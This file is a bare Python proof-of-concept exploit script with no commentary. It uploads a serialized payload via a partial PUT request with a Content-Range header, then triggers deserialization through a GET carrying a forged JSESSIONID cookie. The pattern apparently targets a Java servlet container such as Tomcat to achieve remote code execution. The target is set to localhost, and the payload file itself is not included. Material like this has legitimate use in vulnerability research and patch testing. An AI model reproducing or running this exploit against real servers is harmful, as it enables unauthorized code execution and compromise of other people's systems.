import requests
TARGET = "http://localhost:8080"
SESSION_ID = ".pocss"
PUT_PATH = f"/{SESSION_ID}/sessio"
PAYLOAD_FILE = "payload.ser"

def send_initial_put():
    with open(PAYLOAD_FILE, 'rb') as f:
        payload_data = f.read()
    url = f"{TARGET}{PUT_PATH}"
    headers = {
        "Content-Length": str(len(payload_data)),
    }
    response = requests.put(url, data=payload_data, headers=headers)
    print(f"Initial PUT response: {response.status_code}")


def send_put_request():
    with open(PAYLOAD_FILE, 'rb') as f:
        payload_data = f.read()
    start_byte = 0
    end_byte = len(payload_data)-1
    total_bytes = len(payload_data)
    url = f"{TARGET}{PUT_PATH}"
    headers = {
        "Content-Length": str(len(payload_data)),
        "Content-Range": f"bytes {start_byte}-{end_byte}/{total_bytes}",
    }
    response = requests.put(url, data=payload_data, headers=headers)
    print(f"PUT response: {response.status_code}")

def send_get_trigger():
    headers = {
        "Cookie": f"JSESSIONID={SESSION_ID}",
        "Accept-Encoding": "identity"
    }
    
    response = requests.get(f"{TARGET}/", headers=headers)
    print(f"GET response: {response.status_code}")

if __name__ == "__main__":
    send_initial_put()
    send_put_request()
    send_get_trigger()
